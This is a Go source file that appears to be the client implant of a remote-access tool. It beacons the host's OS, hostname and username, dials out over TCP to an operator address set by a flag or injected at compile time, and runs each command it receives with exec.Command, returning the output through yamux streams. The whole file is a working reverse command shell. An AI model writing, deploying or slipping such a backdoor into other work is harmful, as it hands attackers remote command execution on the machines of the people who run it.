package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/hashicorp/yamux"
)

func hello() string {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	os := runtime.GOOS
	return fmt.Sprintf("%s--%s--%s", os, hostname, user.Username)
}

func doCommand(command string) string {
	split_command := strings.SplitN(command, " ", 3)
	cmd, err := exec.Command(split_command[0], split_command[1:]...).Output()
	if err != nil {
		fmt.Println(err.Error())
		return err.Error()
	}
	return string(cmd)
}

func commands_parser(command string) string {
	switch command {
	case "hello":
		return hello()
	case "whoami":
		return "root"
	case "interract":
		return ""
	default:
		return doCommand(command)
	}
}

func streamReceive(conn net.Conn, session *yamux.Session) {
	buff := make([]byte, 0xff)
	for {
		n, err := conn.Read(buff)
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Printf("Stream read error: %s", err)
			break
		}
		fmt.Printf("Data received : %s\n", buff[:n])
		data := commands_parser(string(buff[:n]))
		streamSend(session, data)
	}
}

func streamSend(session *yamux.Session, data string) {

	stream, err := session.Open()
	if err != nil {
		log.Fatal(err)
	}

	n, err := stream.Write([]byte(data))
	_ = n
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("Data sent : %s\n", data)
	time.Sleep(time.Second)
}

func initiateConnection(connectString string) {
	conn, err := net.Dial("tcp4", connectString)
	if err != nil {
		log.Fatalf("TCP dial: %s", err)
	}

	session, err := yamux.Client(conn, nil)
	if err != nil {
		log.Fatal(err)
	}

	for {
		conn, err := session.Accept()
		if err != nil {
			if session.IsClosed() {
				log.Printf("TCP closed")
				break
			}
			log.Printf("Yamux accept: %s", err)
			continue
		}
		go streamReceive(conn, session)
	}
}

func main() {
	override := flag.String("connect", "", "Override compile-time-injected connectString")
	flag.Parse()

	// TODO
	// Add config file to default
	connectString := "127.0.0.1:9000"

	if *override == "" {
		initiateConnection(connectString)
	} else {
		initiateConnection(*override)
	}
}
